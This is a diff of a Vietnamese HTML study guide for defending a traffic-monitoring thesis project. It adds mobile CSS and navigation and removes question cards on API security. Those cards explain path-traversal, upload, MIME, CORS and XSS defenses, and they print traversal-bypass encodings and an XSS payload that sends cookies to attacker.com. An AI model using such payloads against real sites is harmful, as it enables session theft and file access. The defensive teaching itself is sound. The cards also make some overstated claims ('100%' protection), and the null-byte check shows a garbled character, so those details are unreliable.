@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <title>Tài Liệu Ôn Tập Vấn Đáp Bảo Vệ Đồ Án SMARTTRAFFIC-AI (200 Câu Hỏi Master-Level)</title>
     <!-- MathJax for rendering formulas -->
     <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
@@ -21,250 +21,472 @@
             --highlight: #f59e0b;
             --success: #10b981;
             --danger: #ef4444;
+            --font-main: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
         }
 
+        /* Base Mobile-First Styles */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            font-size: 16px; /* Prevents auto-zoom on iOS inputs */
         }
 
         body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            font-family: var(--font-main);
             background-color: var(--bg-primary);
             color: var(--text-primary);
-            line-height: 1.7;
-            display: flex;
+            line-height: 1.65;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* Sidebar Navigation */
-        #sidebar {
-            width: 320px;
-            background-color: var(--bg-secondary);
-            border-right: 1px solid var(--border);
-            position: fixed;
+        /* Mobile Sticky Navigation Header */
+        #mobile-header {
+            position: sticky;
             top: 0;
-            bottom: 0;
             left: 0;
-            overflow-y: auto;
-            padding: 20px 15px;
-            z-index: 100;
+            right: 0;
+            background-color: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            z-index: 1000;
+            padding: 10px 12px;
         }
 
-        #sidebar h2 {
-            font-size: 1.1rem;
+        .mobile-header-title {
+            font-size: 1.05rem;
+            font-weight: bold;
             color: var(--accent);
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-bottom: 2px solid var(--accent);
-            padding-bottom: 8px;
-        }
-
-        #sidebar ul {
-            list-style: none;
-        }
-
-        #sidebar li {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             margin-bottom: 8px;
         }
 
-        #sidebar a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            font-size: 0.88rem;
-            display: block;
-            padding: 6px 10px;
-            border-radius: 6px;
-            transition: all 0.2s ease;
-        }
-
-        #sidebar a:hover, #sidebar a.active {
+        .mobile-header-title span.badge {
             background-color: rgba(56, 189, 248, 0.15);
             color: var(--accent);
+            font-size: 0.72rem;
+            padding: 2px 8px;
+            border-radius: 12px;
+            border: 1px solid rgba(56, 189, 248, 0.3);
         }
 
-        /* Main Content Area */
+        /* Horizontal Scrollable Chips for Quick Navigation on Mobile */
+        .chips-container {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            white-space: nowrap;
+            padding-bottom: 4px;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none; /* Firefox */
+        }
+
+        .chips-container::-webkit-scrollbar {
+            display: none; /* Chrome/Safari */
+        }
+
+        .chip-item {
+            display: inline-block;
+            background-color: var(--bg-primary);
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            text-decoration: none;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .chip-item:active, .chip-item:hover {
+            background-color: var(--accent);
+            color: #0f172a;
+            border-color: var(--accent);
+        }
+
+        /* Desktop Sidebar - Hidden on Mobile */
+        #sidebar {
+            display: none;
+        }
+
+        /* Main Content Container */
         #main-content {
-            margin-left: 320px;
-            flex: 1;
-            padding: 40px 50px;
-            max-width: 1200px;
+            width: 100%;
+            padding: 16px 14px 40px 14px;
+            max-width: 100%;
         }
 
         .header-banner {
             background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
             border: 1px solid var(--border);
-            border-left: 5px solid var(--accent);
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 40px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid var(--accent);
+            border-radius: 10px;
+            padding: 16px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
         }
 
         .header-banner h1 {
-            font-size: 2.2rem;
+            font-size: 1.35rem;
             color: #ffffff;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            line-height: 1.3;
         }
 
         .header-banner p {
             color: var(--text-secondary);
-            font-size: 1.05rem;
+            font-size: 0.88rem;
+            line-height: 1.5;
         }
 
         .group-header {
-            font-size: 1.6rem;
+            font-size: 1.25rem;
             color: var(--accent);
             border-bottom: 2px solid var(--border);
-            padding-bottom: 10px;
-            margin: 50px 0 25px 0;
-            scroll-margin-top: 20px;
+            padding-bottom: 8px;
+            margin: 32px 0 16px 0;
+            scroll-margin-top: 100px; /* Offset for sticky top header */
+            word-wrap: break-word;
         }
 
+        /* Question & Answer Cards */
         .qa-card {
             background-color: var(--bg-card);
             border: 1px solid var(--border);
             border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 25px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .qa-card:hover {
-            border-color: rgba(56, 189, 248, 0.4);
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+            scroll-margin-top: 100px;
         }
 
         .question-title {
-            font-size: 1.2rem;
+            font-size: 1.05rem;
             color: #f1f5f9;
-            margin-bottom: 15px;
-            line-height: 1.4;
-            display: flex;
-            align-items: baseline;
+            margin-bottom: 12px;
+            line-height: 1.45;
+            font-weight: 600;
         }
 
         .question-title span.q-num {
             color: var(--accent);
             font-weight: bold;
-            margin-right: 10px;
-            white-space: nowrap;
+            display: inline-block;
+            margin-right: 6px;
         }
 
         .answer-box {
             color: #cbd5e1;
-            font-size: 0.98rem;
-            text-align: justify;
+            font-size: 0.94rem;
+            line-height: 1.65;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
         }
 
         .answer-box p {
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .answer-box ul, .answer-box ol {
-            margin: 10px 0 15px 25px;
+            margin: 8px 0 12px 20px;
+            padding-left: 0;
         }
 
         .answer-box li {
             margin-bottom: 6px;
         }
 
+        /* Responsive Code Blocks */
         code {
             background-color: var(--code-bg);
             color: #38bdf8;
-            padding: 2px 6px;
+            padding: 2px 5px;
             border-radius: 4px;
             font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 0.9em;
+            font-size: 0.85em;
             border: 1px solid var(--border);
+            word-break: break-word;
+        }
+
+        pre {
+            margin: 12px 0;
+            border-radius: 8px;
+            overflow: hidden;
         }
 
         pre code {
             display: block;
-            padding: 15px;
+            padding: 12px;
             overflow-x: auto;
             white-space: pre;
-            line-height: 1.5;
+            line-height: 1.45;
+            font-size: 0.82em;
+            -webkit-overflow-scrolling: touch;
         }
 
+        /* Responsive Math & Tables */
         .formula-block {
-            background-color: rgba(15, 23, 42, 0.8);
+            background-color: rgba(15, 23, 42, 0.85);
             border-left: 3px solid var(--highlight);
-            padding: 12px 18px;
-            margin: 15px 0;
-            border-radius: 0 8px 8px 0;
-            font-size: 1.05rem;
+            padding: 10px 12px;
+            margin: 12px 0;
+            border-radius: 0 6px 6px 0;
+            font-size: 0.92rem;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            max-width: 100%;
         }
 
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 12px 0;
+            display: block;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            font-size: 0.85rem;
+        }
+
+        th, td {
+            padding: 8px 10px;
+            border: 1px solid var(--border);
+            text-align: left;
+        }
+
+        th {
+            background-color: rgba(15, 23, 42, 0.9);
+            color: var(--accent);
+        }
+
+        /* Video References & Debate Cards */
         .video-box {
-            margin-top: 15px;
-            padding: 12px 16px;
-            background-color: rgba(15, 23, 42, 0.6);
+            margin-top: 12px;
+            padding: 10px 12px;
+            background-color: rgba(15, 23, 42, 0.7);
             border: 1px solid var(--border);
             border-radius: 8px;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: center;
+            font-size: 0.82rem;
+            word-break: break-word;
+            line-height: 1.4;
         }
 
         .video-box strong {
             color: #f59e0b;
-            margin-right: 8px;
+            display: block;
+            margin-bottom: 4px;
         }
 
         .video-box a {
             color: var(--accent);
             text-decoration: none;
-            word-break: break-all;
-        }
-
-        .video-box a:hover {
-            text-decoration: underline;
         }
 
         .badge-open {
             display: inline-block;
             background-color: rgba(245, 158, 11, 0.2);
             color: #f59e0b;
-            font-size: 0.75rem;
-            padding: 2px 8px;
+            font-size: 0.7rem;
+            padding: 2px 6px;
             border-radius: 4px;
-            margin-left: 10px;
+            margin-top: 4px;
             text-transform: uppercase;
             font-weight: bold;
         }
 
         .debate-section {
-            background-color: rgba(30, 41, 59, 0.5);
+            background-color: rgba(30, 41, 59, 0.6);
             border: 1px solid #334155;
             border-radius: 8px;
-            padding: 15px;
-            margin-top: 12px;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 0.9rem;
         }
 
         .debate-title {
             font-weight: bold;
             color: #f59e0b;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
+            font-size: 0.88rem;
         }
 
-        @media (max-width: 900px) {
-            #sidebar {
+        /* Floating Back to Top Button */
+        #fab-top {
+            position: fixed;
+            bottom: 16px;
+            right: 16px;
+            width: 44px;
+            height: 44px;
+            background-color: var(--accent);
+            color: #0f172a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-decoration: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            z-index: 999;
+            transition: transform 0.2s ease;
+        }
+
+        #fab-top:active {
+            transform: scale(0.9);
+        }
+
+        /* Desktop Enhancement (> 992px) */
+        @media (min-width: 992px) {
+            #mobile-header {
                 display: none;
             }
+
+            body {
+                flex-direction: row;
+            }
+
+            #sidebar {
+                display: block;
+                width: 300px;
+                background-color: var(--bg-secondary);
+                border-right: 1px solid var(--border);
+                position: fixed;
+                top: 0;
+                bottom: 0;
+                left: 0;
+                overflow-y: auto;
+                padding: 24px 16px;
+                z-index: 100;
+            }
+
+            #sidebar h2 {
+                font-size: 1.1rem;
+                color: var(--accent);
+                margin-bottom: 16px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                border-bottom: 2px solid var(--accent);
+                padding-bottom: 8px;
+            }
+
+            #sidebar ul {
+                list-style: none;
+            }
+
+            #sidebar li {
+                margin-bottom: 6px;
+            }
+
+            #sidebar a {
+                color: var(--text-secondary);
+                text-decoration: none;
+                font-size: 0.85rem;
+                display: block;
+                padding: 6px 10px;
+                border-radius: 6px;
+                transition: all 0.2s ease;
+            }
+
+            #sidebar a:hover {
+                background-color: rgba(56, 189, 248, 0.15);
+                color: var(--accent);
+            }
+
             #main-content {
-                margin-left: 0;
-                padding: 20px;
+                margin-left: 300px;
+                padding: 40px 50px;
+                max-width: 1100px;
+            }
+
+            .header-banner {
+                padding: 28px;
+                margin-bottom: 36px;
+            }
+
+            .header-banner h1 {
+                font-size: 2.1rem;
+            }
+
+            .header-banner p {
+                font-size: 1.02rem;
+            }
+
+            .group-header {
+                font-size: 1.55rem;
+                margin: 48px 0 24px 0;
+                scroll-margin-top: 30px;
+            }
+
+            .qa-card {
+                padding: 24px;
+                margin-bottom: 24px;
+            }
+
+            .question-title {
+                font-size: 1.18rem;
+            }
+
+            .answer-box {
+                font-size: 0.98rem;
+            }
+
+            .formula-block {
+                padding: 12px 18px;
+                font-size: 1.02rem;
+            }
+
+            .video-box {
+                font-size: 0.88rem;
+                padding: 12px 16px;
+            }
+
+            #fab-top {
+                bottom: 24px;
+                right: 24px;
+                width: 48px;
+                height: 48px;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Mobile Header with Horizontal Scroll Chips -->
+    <div id="mobile-header">
+        <div class="mobile-header-title">
+            <span>SMARTTRAFFIC-AI</span>
+            <span class="badge">200 Câu Hỏi Master</span>
+        </div>
+        <div class="chips-container">
+            <a href="#group-A" class="chip-item">A. CV & DL</a>
+            <a href="#group-B" class="chip-item">B. YOLOv8</a>
+            <a href="#group-C" class="chip-item">C. Training</a>
+            <a href="#group-D" class="chip-item">D. ByteTrack</a>
+            <a href="#group-E" class="chip-item">E. HSV Light</a>
+            <a href="#group-F" class="chip-item">F. Geometry</a>
+            <a href="#group-G" class="chip-item">G. PCU Density</a>
+            <a href="#group-H" class="chip-item">H. Violation</a>
+            <a href="#group-I" class="chip-item">I. System Architecture</a>
+            <a href="#group-J" class="chip-item">J. API Security</a>
+            <a href="#group-K" class="chip-item">K. Testing</a>
+            <a href="#group-L" class="chip-item">L. Frontend</a>
+            <a href="#group-M" class="chip-item">M. Phản Biện Mở</a>
+        </div>
+    </div>
+
+    <!-- Desktop Sidebar -->
     <div id="sidebar">
         <h2>SMARTTRAFFIC-AI</h2>
-        <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 15px;">Tài liệu 200 câu hỏi ôn tập vấn đáp Master</p>
+        <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 15px;">200 Câu hỏi ôn tập vấn đáp Master</p>
         <ul>
             <li><a href="#group-A">A. CV & Deep Learning (1-15)</a></li>
             <li><a href="#group-B">B. YOLOv8 Architecture (16-35)</a></li>
@@ -282,11 +504,12 @@
         </ul>
     </div>
 
+    <!-- Main Content Area -->
     <div id="main-content">
         <div class="header-banner">
             <h1>Tài Liệu Ôn Tập Vấn Đáp Bảo Vệ Đồ Án</h1>
-            <p><strong>Đề tài:</strong> Hệ thống Giám sát Giao thông Thông minh SMARTTRAFFIC-AI (YOLOv8 + ByteTrack + PCU Density + OpenCV HSV + FastAPI Security)</p>
-            <p style="margin-top: 8px; font-size: 0.9rem; color: var(--accent);">Biên soạn chuẩn trình độ Thạc sĩ Computer Vision — Phân tích chi tiết code thực tế & Toán học sâu sắc</p>
+            <p><strong>Đề tài:</strong> Hệ thống Giám sát Giao thông SMARTTRAFFIC-AI (YOLOv8 + ByteTrack + PCU Density + OpenCV HSV + FastAPI Security)</p>
+            <p style="margin-top: 6px; font-size: 0.85rem; color: var(--accent);">Biên soạn chuẩn trình độ Thạc sĩ Computer Vision — Phân tích chi tiết code thực tế & Toán học sâu sắc</p>
         </div>
 <h2 id="group-A" class="group-header">## A. KIẾN THỨC NỀN TẢNG COMPUTER VISION & DEEP LEARNING (15 câu)</h2>
 
@@ -3982,1436 +4205,4 @@ def enforce_session_limit() -> None:
                 
 <p><strong>1. Mã nguồn trong <code>backend/main.py</code> (dòng 457-464):</strong></p>
 <pre><code>def resolve_evidence_path(relative_path: str) -> Path:
-    if not relative_path or " " in relative_path:
-        raise HTTPException(status_code=400, detail="Invalid evidence path.")
-    base = EVIDENCE_DIR.resolve()
-    candidate = (base / relative_path).resolve()
-    if base != candidate and base not in candidate.parents:
-        raise HTTPException(status_code=400, detail="Invalid evidence path.")
-    return candidate</code></pre>
-
-<p><strong>2. Phân tích tác dụng từng bước kiểm tra:</strong></p>
-
-<ul>
-    <li><strong>Bước 1: Kiểm tra <code>" " in relative_path</code> (Chống Null Byte Injection Attack):</strong>
-        <br>Ký tự <code> </code> (Null byte) được dùng để kết thúc chuỗi trong ngôn ngữ C/C++ (mà OpenCV và hệ thống tệp OS bên dưới sử dụng). Kẻ tấn công có thể truyền <code>evidence.jpg .php</code> để qua mặt các bộ lọc đuôi file. Việc chặn Null byte triệt tiêu hoàn toàn loại tấn công này.
-    </li>
-    <li><strong>Bước 2: Chuẩn hóa đường dẫn <code>.resolve()</code>:</strong> Giải mã toàn bộ các ký tự <code>../</code> và liên kết mềm (symlink) để chuyển về đường dẫn tuyệt đối chuẩn (Canonical Absolute Path).</li>
-    <li><strong>Bước 3: Kiểm tra <code>base not in candidate.parents</code> (Chống thoát khỏi Thư mục gốc):</strong>
-        <br>Đảm bảo rằng tệp <code>candidate</code> sau khi chuẩn hóa **BẮT BUỘC PHẢI NẰM BÊN TRONG THƯ MỤC CHA <code>EVIDENCE_DIR</code>**. Nếu <code>candidate</code> nằm ngoài thư mục <code>evidence/</code>, câu lệnh <code>if</code> sẽ nâng ngoại lệ <code>HTTPException 400</code> chặn đứng cuộc tấn công.
-    </li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Preventing Directory Traversal in Python Backends — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-148">
-            <div class="question-title">
-                <span class="q-num">### Câu 148:</span>
-                <span>Tại sao chỉ kiểm tra chuỗi thô (string) không đủ để chống path traversal, mà cần .resolve() (chuẩn hóa đường dẫn tuyệt đối) trước khi so sánh?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Tại sao lọc chuỗi thô (String Matching / Replace) luôn bị vượt qua (Bypass)?</strong></p>
-
-<p>Kẻ tấn công có rất nhiều kỹ thuật mã hóa (encoding) để lẩn tránh bộ lọc chuỗi đơn giản:</p>
-<ul>
-    <li>Mã hóa URL (URL Encoding): <code>%2e%2e%2f</code> (tương đương <code>../</code>).</li>
-    <li>Mã hóa Double URL Encoding: <code>%252e%252e%252f</code>.</li>
-    <li>Mã hóa Unicode / UTF-8 Overlong: <code>..%c0%af</code>.</li>
-    <li>Kỹ thuật chèn đan xen: <code>....//</code> (nếu code chỉ xóa <code>../</code>, chuỗi còn lại vẫn là <code>../</code>!).</li>
-</ul>
-
-<p><strong>2. Tại sao phương pháp <code>.resolve()</code> là giải pháp triệt để tuyệt đối?</strong></p>
-<p>Phương pháp <code>Path.resolve()</code> tương tác trực tiếp với Kernel của Hệ điều hành để giải mã tất cả các liên kết symbolic link, đường dẫn tương đối <code>../</code>, và biến đổi mọi biến thể chuỗi về duy nhất **Đường dẫn Tuyệt đối Chuẩn (Canonical Path)**. Việc so sánh <code>base in candidate.parents</code> trên đường dẫn tuyệt đối đã chuẩn hóa giúp loại bỏ 100% mọi kỹ thuật qua mặt lọc chuỗi.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Path Normalization & Canonical Path Security in Python — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-149">
-            <div class="question-title">
-                <span class="q-num">### Câu 149:</span>
-                <span>resolve_model_path() trong model_registry.py chặn candidate.is_absolute() — vì sao đường dẫn tuyệt đối lại nguy hiểm trong ngữ cảnh chọn model từ dropdown?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Mã nguồn trong <code>core/model_registry.py</code> (dòng 29-30):</strong></p>
-<pre><code>if candidate.is_absolute():
-    raise ValueError("Absolute model paths are not allowed.")</code></pre>
-
-<p><strong>2. Lý do đường dẫn tuyệt đối (Absolute Path) nguy hiểm:</strong></p>
-<p>Dropdown chọn model trên Web Frontend gửi một chuỗi <code>model_path</code> về Backend API. Nếu cho phép người dùng truyền đường dẫn tuyệt đối (ví dụ: <code>C:\Users\Administrator\Desktop\malicious_model.pt</code> hoặc <code>/etc/shadow</code>):</p>
-<ul>
-    <li>Kẻ tấn công có thể ép Server nạp các tệp mô hình PyTorch độc hại nằm ở bất kỳ đâu trên ổ đĩa của máy chủ.</li>
-    <li>Kẻ tấn công có thể chỉ định các tệp hệ thống để kích hoạt lỗi đọc tệp không hợp lệ, từ đó thu thập thông tin cấu trúc thư mục của máy chủ (Information Disclosure).</li>
-</ul>
-<p>Chặn <code>candidate.is_absolute()</code> và ép mô hình phải nằm trong thư mục <code>models/</code> dự án đảm bảo ứng dụng chạy trong vùng cách ly an toàn (Sandboxing).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">File Upload Security & Path Restrictions in Python — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-150">
-            <div class="question-title">
-                <span class="q-num">### Câu 150:</span>
-                <span>MAX_UPLOAD_BYTES = 500MB và việc đọc file theo chunk 1MB trong save_upload() — nếu không giới hạn dung lượng, kiểu tấn công DoS nào có thể xảy ra?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Mã nguồn trong <code>backend/main.py</code> (dòng 38):</strong></p>
-<pre><code>MAX_UPLOAD_BYTES = 500 * 1024 * 1024  # 500MB Limit</code></pre>
-
-<p><strong>2. Các kiểu Tấn công Từ chối Dịch vụ (DoS) nếu KHÔNG giới hạn dung lượng & không đọc theo Chunk:</strong></p>
-<ul>
-    <li><strong>Kiểu 1: Tấn công Tràn Bộ nhớ RAM (RAM Exhaustion / Out of Memory DoS):</strong> Nếu code dùng <code>await file.read()</code> đọc toàn bộ tệp vào RAM một lúc, một tệp video độc hại nặng 10 GB gửi lên sẽ ép Server nạp 10 GB vào RAM, khiến toàn bộ ứng dụng Python bị OS crash (OOM Killer). Đọc theo **Chunk 1MB** giúp giữ mức chiếm dụng RAM của request ở mức cố định 1MB.</li>
-    <li><strong>Kiểu 2: Tấn công Tràn Ổ đĩa (Disk Space Exhaustion DoS):</strong> Kẻ tấn công gửi liên tục các tệp rác dung lượng hàng trăm GB làm đầy 100% dung lượng ổ đĩa của Server, khiến cơ sở dữ liệu SQLite bị hỏng và Server ngưng hoạt động. Giới hạn 500MB chặn đứng nguy cơ này.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Chunked File Upload & Denial of Service Protection in FastAPI — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-151">
-            <div class="question-title">
-                <span class="q-num">### Câu 151:</span>
-                <span>VALID_UPLOAD_EXTENSIONS = {.mp4, .avi, .mov} chỉ kiểm tra bằng đuôi file (suffix) — điều này có đủ an toàn không, hay 1 attacker vẫn có thể đổi tên file .exe thành .mp4 và upload?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Phân tích lỗ hổng kiểm tra Đuôi file (Extension-only Validation):</strong></p>
-
-<p>KHÔNG ĐỦ AN TOÀN NẾU ĐỨNG ĐỘC LẬP!</p>
-<p>Kẻ tấn công hoàn toàn có thể đổi tên tệp thực thi độc hại <code>malware.exe</code> thành <code>malware.mp4</code> và tải lên thành công qua bộ lọc đuôi file.</p>
-
-<p><strong>2. Tại sao hệ thống SMARTTRAFFIC-AI vẫn an toàn trước kịch bản này?</strong></p>
-<ol>
-    <li>Tệp sau khi upload được truyền trực tiếp vào thư viện **OpenCV C++ (<code>cv2.VideoCapture</code>)** để giải mã luồng video. OpenCV kiểm tra tiêu đề binary header của file: nếu không phải là cấu trúc container video MP4/AVI/MOV hợp lệ, <code>capture.isOpened()</code> sẽ trả về <code>False</code> và tệp lập tức bị xóa bỏ ngay (dòng 70 <code>main.py</code>).</li>
-    <li>Tệp upload không bao giờ được cấp quyền thực thi (No Execute Permission <code>chmod -x</code>) trên Server và không bao giờ được chạy qua các hàm nguy hiểm như <code>exec()</code> hay <code>eval()</code>.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">File Upload Security: Magic Bytes vs File Extension — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-152">
-            <div class="question-title">
-                <span class="q-num">### Câu 152:</span>
-                <span>video.content_type.startswith("video/") kiểm tra MIME type — MIME type do client gửi lên có đáng tin cậy 100% không? Vì sao?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Trả lời:</strong> MIME Type do Client gửi lên **HOÀN TOÀN KHÔNG ĐÁNG TIN CẨY (Untrusted Client Input)**!</p>
-
-<p><strong>2. Giải thích lý do kỹ thuật:</strong></p>
-<p>MIME Type (như <code>Content-Type: video/mp4</code>) nằm trong phần tiêu đề HTTP Header do phía Client (trình duyệt hoặc các công cụ như Postman, Burp Suite, cURL) tự tạo ra và gửi lên Server.</p>
-<p>Kẻ tấn công có thể dễ dàng dùng Postman hoặc Burp Suite sửa đổi thủ công tiêu đề HTTP Header thành <code>Content-Type: video/mp4</code> trong khi dữ liệu payload bên dưới thực chất là một script shell PHP hoặc file thực thi ELF/EXE. Do đó, Server **không bao giờ được tin tưởng hoàn toàn vào MIME Type của Client** mà phải kiểm tra thực tế bằng thư viện đọc file (như <code>python-magic</code> kiểm tra Magic Bytes hoặc <code>cv2.VideoCapture</code>).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Why Client-Provided MIME Types Are Insecure — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-153">
-            <div class="question-title">
-                <span class="q-num">### Câu 153:</span>
-                <span>Escape XSS ở frontend qua escapeHtml() — giải thích cơ chế tấn công XSS (Cross-Site Scripting) mà hàm này ngăn chặn, cho ví dụ payload cụ thể.</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Khái niệm Tấn công Cross-Site Scripting (XSS):</strong></p>
-<p>XSS là lỗ hổng xảy ra khi ứng dụng Web chèn trực tiếp dữ liệu từ nguồn không an toàn (như chuỗi từ database hoặc input người dùng) vào DOM của trang web mà không qua mã hóa ký tự đặc biệt, khiến trình duyệt hiểu nhầm chuỗi dữ liệu đó là mã thẻ HTML/JavaScript thực thi.</p>
-
-<p><strong>2. Kịch bản Payload cụ thể:</strong></p>
-<p>Giả sử kẻ tấn công cố tình đặt tên tệp video upload hoặc nhãn vi phạm chứa đoạn mã độc Stored XSS:</p>
-<div class="formula-block">
-<code>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>
-</div>
-<p>Nếu Frontend chèn trực tiếp chuỗi này vào thẻ <code>innerHTML</code> trên bảng nhật ký vi phạm, đoạn mã script trên sẽ tự động chạy trên trình duyệt của cán bộ quản lý, đánh cắp Session Cookie của họ.</p>
-
-<p><strong>3. Cơ chế của <code>escapeHtml()</code>:</strong></p>
-<p>Hàm <code>escapeHtml()</code> biến đổi các ký tự điều khiển HTML thành các thực thể an toàn (HTML Entities):</p>
-<ul>
-    <li><code>&lt;</code> &rarr; <code>&amp;lt;</code></li>
-    <li><code>&gt;</code> &rarr; <code>&amp;gt;</code></li>
-    <li><code>"</code> &rarr; <code>&amp;quot;</code></li>
-    <li><code>'</code> &rarr; <code>&amp;#039;</code></li>
-</ul>
-<p>Trình duyệt hiển thị đoạn chữ an toàn trên màn hình mà không thực thi mã script.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=vVjZ8J6n45c" target="_blank" rel="noopener noreferrer">Cross-Site Scripting (XSS) Attack & Defense Prevention — https://www.youtube.com/watch?v=vVjZ8J6n45c</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-154">
-            <div class="question-title">
-                <span class="q-num">### Câu 154:</span>
-                <span>CORS được cấu hình allow_origins=["*"] trong backend/main.py — đây có phải cấu hình an toàn cho môi trường production không? Rủi ro là gì?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Mã nguồn trong <code>backend/main.py</code>:</strong></p>
-<pre><code>app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)</code></pre>
-
-<p><strong>2. Phán quyết Security: KHÔNG AN TOÀN CHO PRODUCTION!</strong></p>
-
-<p>Cấu hình <code>allow_origins=["*"]</code> (Wildcard Origin) chỉ phù hợp cho môi trường thử nghiệm Development cục bộ.</p>
-
-<p><strong>3. Rủi ro Bảo mật khi đưa lên Production:</strong></p>
-<ul>
-    <li>Cấu hình này cho phép **BẤT KỲ trang web độc hại nào trên Internet** (ví dụ <code>http://malicious-website.com</code>) mở kết nối AJAX/Fetch gọi tới Backend API của hệ thống giao thông.</li>
-    <li>Kẻ tấn công có thể tạo một trang web giả mạo, dụ dỗ cán bộ quản lý truy cập, từ đó trang web độc hại sẽ bí mật thực hiện lệnh gọi <code>DELETE /api/sessions/id</code> hoặc tải dữ liệu nhật ký vi phạm về máy kẻ tấn công (Cross-Origin Data Theft).</li>
-</ul>
-<p><em>Cách khắc phục trên Production:</em> Chỉ định chính xác Domain được phép: <code>allow_origins=["https://smarttraffic.gov.vn"]</code>.</p>
-
-            </div>
